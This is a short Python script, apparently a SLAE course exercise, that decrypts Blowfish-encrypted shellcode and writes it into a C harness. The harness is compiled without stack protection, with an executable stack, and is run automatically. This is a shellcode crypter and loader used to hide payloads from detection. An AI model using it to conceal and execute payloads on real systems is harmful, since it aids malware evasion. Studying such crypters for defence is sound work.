# Author: SLAE-27812 (Felipe Winsnes)

from Crypto.Cipher import Blowfish
import sys, os

if len(sys.argv) != 3:

   print "[*] Example: python decrypt.py <key> <IV number>" + "\r\n"
   sys.exit(1)

decrypted = ""

ciphertext = ("\x24\x5c\xc5\x8c\x39\x23\x01\x95\xfd\x4c\x76\x81\x92\xb4\x97\x18\x94\xb7\xf1\x4e\x7e\xb2\xd3\x42")

obj = Blowfish.new(sys.argv[1], Blowfish.MODE_CBC, sys.argv[2])

decrypt = obj.decrypt(ciphertext)
shellcode = decrypt

print "Original shellcode in hex escape sequence:"

for x in bytearray(decrypt):

  decrypted += '\\x'
  decrypt = '%02x' % x
  decrypted += decrypt

print '"' + (decrypted) + '"'

shellcode = '"' + (decrypted) + '"'

template = (

"#include <stdio.h>" + "\r\n"
"#include <string.h>" + "\r\n"

"unsigned char code[] = \\" + '\r\n'
+ shellcode + ";" + "\r\n" + "\r\n"

"main()" + "\r\n"
"{" + "\r\n"

  'printf("\\n");' + "\r\n"

        "int (*ret)() = (int(*)())code;" + "\r\n"

        "ret();" + "\r\n"

"}"

)

f = open ("test.c", "w")
f.write(template)
f.close()

os.system("/usr/bin/gcc ./test.c -o test -fno-stack-protector -z execstack -Wall -Wno-implicit && /bin/rm ./test.c && ./test")
os.system("/bin/rm ./test")
